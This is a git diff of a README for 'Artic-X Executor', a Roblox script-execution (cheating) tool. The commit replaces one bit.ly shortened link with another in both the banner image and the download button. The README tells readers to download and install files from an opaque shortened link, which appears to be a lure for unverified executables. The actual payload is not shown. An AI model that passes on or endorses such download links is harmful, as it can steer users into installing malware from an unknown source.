@@ -707,7 +707,7 @@
 
 Welcome to the Artic-X Executor repository! 🚀 This repository hosts the latest version of the Artic-X Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Artic-X Executor](https://bit.ly/4iazS1U)
+![Artic-X Executor](https://bit.ly/4g3xvfh)
 
 ## Table of Contents
 
@@ -1202,7 +1202,7 @@ Artic-X Executor is a cutting-edge executor designed for Roblox script execution
 
 To get started with Artic-X Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Artic-X Executor](https://bit.ly/4iazS1U).
+1. Download the latest version of the executor from the following link: [![Download Artic-X Executor](https://bit.ly/4g3xvfh).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
